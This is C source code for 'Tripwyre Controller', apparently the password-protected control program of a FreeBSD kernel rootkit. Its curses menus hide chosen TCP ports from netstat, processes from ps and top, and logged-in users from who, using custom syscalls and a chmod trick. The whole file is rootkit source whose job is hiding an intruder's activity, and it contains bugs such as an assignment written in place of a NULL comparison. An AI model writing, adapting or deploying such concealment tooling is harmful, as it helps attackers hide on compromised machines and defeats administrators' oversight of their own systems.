#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

#include <signal.h>
#include <curses.h>
#include <termios.h>

#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/module.h>

#include "controller_options.h"

#define MAXCOL 80
#define MAXROW 25

#define PROCESS_SYSCALL 210
#define PORT_SYSCALL  211

struct termios tty, ntty;

void menupage(void);
void hide_user(char *);
void hide_process(void);
void hide_port(int);
void rerun(void);
void updown(int);
void showlastpart(void);
void runpsax(void);
void highlight(void);

/* Pointer to the current window object */
WINDOW *scrn;

char cmdoutlines[MAXROW][MAXCOL];

int ncmdlines, /* number of rows in cmdoutlines */ 
    nwinlines, /* number of rows our output occupies */
    winrow, /* current window position  */
    cmdstartrow, /* index of first row in cmdoutlines to be displayed  */
    cmdlastrow; /* index of last row in cmdoutlines to be displayed */

/* Highlight the current entry */

void highlight()
{
  int clinenum;
  attron(A_BOLD);
  clinenum = cmdstartrow + winrow;
  mvaddstr(winrow, 0, cmdoutlines[clinenum]);
  attroff(A_BOLD);
  refresh();
}

void runpsax()
{
  FILE *p; char ln[MAXCOL]; int row;
  char *tmp;
  p = popen("ps", "r");

  for(row = 0; row < MAXROW; row++){
    tmp = fgets(ln, MAXCOL, p);
    if (tmp = NULL) break;
    strncpy(cmdoutlines[row],ln,COLS);
    cmdoutlines[row][MAXCOL-1] = 0;
  }

  ncmdlines = row;
  close((int) p);
}

void showlastpart()
{
  int row;
  clear();

  if(ncmdlines <= LINES) {
    cmdstartrow = 0;
    nwinlines = ncmdlines;
  }

  else {
    cmdstartrow = ncmdlines - LINES;
    nwinlines = LINES;
  }

  cmdlastrow = cmdstartrow + nwinlines - 1;

  for (row = cmdstartrow, winrow = 0; row <= cmdlastrow; row++, winrow++)
    mvaddstr(winrow,0,cmdoutlines[row]);

  refresh();

  winrow--;
  highlight();
}

/* moves up and down between the processes */
void updown (int inc)
{
  int tmp = winrow + inc;

  if (tmp >= 0 && tmp < LINES) {
    mvaddstr(winrow, 0, cmdoutlines[cmdstartrow+winrow]);
    winrow = tmp;
    highlight();
  }
}

void rerun()
{
  runpsax();
  showlastpart();
}

void hide_user(char *user)
{
  chmod(user,SIGHIDEME);
}

void hide_process(void)
{
  char *pid;
  int syscall_num = PROCESS_SYSCALL;
  struct module_stat stat;
  
  pid = strtok(cmdoutlines[cmdstartrow+winrow], " ");
  
  stat.version = sizeof(stat);
  syscall(syscall_num, atoi(pid));
  rerun();
}

void hide_port(int port)
{
  int syscall_num = PORT_SYSCALL;
  struct module_stat stat;
  
  stat.version = sizeof(stat);
  syscall(syscall_num, port);
}

void menupage()
{
  char c,d,e;
  FILE *p; 
  char ln[MAXCOL];
  int row, port;
  char *tmp;
  char username[100];

  clear();
  scrn = initscr();
  noecho();
 
  while(1) {

    clear();
    refresh();
    cbreak();
    // box(scrn, ACS_VLINE, ACS_HLINE); /* draw a box around the screen */
    nonl();
    intrflush(stdscr, FALSE);
    keypad(stdscr, TRUE);

    mvwprintw(scrn, (5), (15), "Tripwyre Controller");

    /* show the menu page */
    mvwprintw(scrn, (10), (15), "(a) Hide a TCP Port from netstat(1)");
    mvwprintw(scrn, (12), (15), "(b) Hide a Process from ps(1) and top(1)");
    mvwprintw(scrn, (14), (15), "(c) Hide a logged user from who(1)");
    mvwprintw(scrn, (16), (15), "(q) Quit Tripwyre Controller");
    mvwprintw(scrn, (18), (15), "(h) Help for this program");
    mvwprintw(scrn, (20), (15), "Enter a, b, c, h or q: ");
   
    c = getch();

    if(c == 'a') {
      clear();
      cbreak();
      // box(scrn, ACS_VLINE, ACS_HLINE); /* draw a box around the screen */
      nonl();
      intrflush(stdscr, FALSE);
      keypad(stdscr, TRUE);
      mvwprintw(scrn, (5), (15), "Tripwyre Controller");
      p = popen("netstat -anp tcp", "r");
      
      for (row = 10; row < MAXROW; row++) {
	tmp = fgets(ln, MAXCOL, p);
	if (tmp == NULL) break;
	mvwprintw(scrn, row, (0), "%s", ln);
      }
      
      mvwprintw(scrn, (20), (15), "(y) Enter the port         ");
      mvwprintw(scrn, (21), (15), "(m) Go back to main menu   ");
      mvwprintw(scrn, (22), (15), "(y or m): ");
      d = getch();
      if(d == 'm'){
	close ((int) p);
	continue;
      }
      else if (d == 'y') {
	refresh(); 
	def_prog_mode();
	endwin();
	scanf("%d", &port);
	refresh();
	hide_port(port);
	mvwprintw(scrn, (20), (15), "Port Hidden               ");
	refresh();
	getch();
	close((int) p);
	continue;
      }
      else {
	beep();
	close((int) p);
	continue;
      }
    }
    
    else if (c == 'b') { 
      clear();
      cbreak();
      //box(scrn, ACS_VLINE, ACS_HLINE); /* draw a box around the screen */
      nonl();
      intrflush(stdscr, FALSE);
      keypad(stdscr, TRUE);
      refresh();
      mvwprintw(scrn, (13), (15), "In the Process List:");
      mvwprintw(scrn, (14), (15), "   Press u to go up");
      mvwprintw(scrn, (15), (15), "   Press d to go down");
      mvwprintw(scrn, (16), (15), "   Press h to hide");
      mvwprintw(scrn, (17), (15), "   Press r to refresh");
      mvwprintw(scrn, (18), (15), "   press m to main-menu");
      mvwprintw(scrn, (22), (15), "(y) Goto to Process List");
      mvwprintw(scrn, (23), (15), "(m) Return to main menu");
      mvwprintw(scrn, (24), (15), "(y or m): ");
      d = getch();
      if (d == 'm')
	continue;
      else if (d == 'y'){
	runpsax();
	showlastpart();
	
	while(1) {
	  e = getch();
	  if (e == 'u') updown(-1);
	  else if (e == 'd') updown(1);
	  else if (e == 'r') rerun();
	  else if (e == 'h') hide_process();
	  else if (e == 'm') break;
	  else beep();
	}
	
	continue;
      }
      else{
	beep();
	continue;
      }
    }
    
    else if (c == 'c') {
      clear();
      cbreak();
      // box(scrn, ACS_VLINE, ACS_HLINE); /* draw a box around the screen */
      nonl();
      intrflush(stdscr, FALSE);
      keypad(stdscr, TRUE);
      mvwprintw(scrn, (5), (15), "Tripwyre Controller");
      p = popen("who", "r");
      refresh();
      for (row = 10; row < MAXROW; row++) {
	tmp = fgets(ln, MAXCOL, p);
	if (tmp == NULL) break;
	mvwprintw(scrn, row, (0), "%s", ln);
      }
      refresh();
      
      mvwprintw(scrn, (20), (15), "(y) Enter the User Name   ");
      mvwprintw(scrn, (21), (15), "(m) Go Back to main menu ");
      mvwprintw(scrn, (22), (15), "(y or m): ");
      d = getch();
      if (d == 'm') {
	close ((int) p);
	continue;
      }
      else if (d == 'y') {
	refresh(); 
	def_prog_mode();
	endwin();
	scanf("%s", username);
	hide_user(username);
	mvwprintw(scrn, (20), (15), "User Hidden            ");
	refresh();
	getch();
	close((int) p);
	refresh();
	continue;
      }
      else{
	beep();
	close((int) p);
	continue;
      }
    }

    else if (c == 'h') {
      endwin();
      system("cat README | more");
      refresh();
      continue;
    }
    
    else if (c == 'q') {
      endwin();
      exit(0);
    }
    
    else {
      beep();
    }
  }
}

int main (int argc, char *argv[])
{
  char *computed_hash;
  char *gotpw = malloc(PASS_CHAR * sizeof(char));

  /* Clear the screen */

  tcgetattr(0, &tty);
  tcgetattr(0, &ntty);
  
  tty.c_lflag &= ~ECHO;
  (void)tcsetattr(0, TCSADRAIN, &tty);

  fprintf(stdout, "Enter the passphrase (won't echo): ");

  if(!fgets(gotpw, PASS_CHAR, stdin))
    exit(0);

  (void)tcsetattr(0, TCSADRAIN, &ntty); /* restore the screen */
  computed_hash = crypt(gotpw, SALT);

  if(strcmp(computed_hash, HASH) != 0) {
    fprintf(stdout, "invalid passphrase\n");
    exit(0);
  }

  menupage(); /* continue */
  return EXIT_SUCCESS;
}
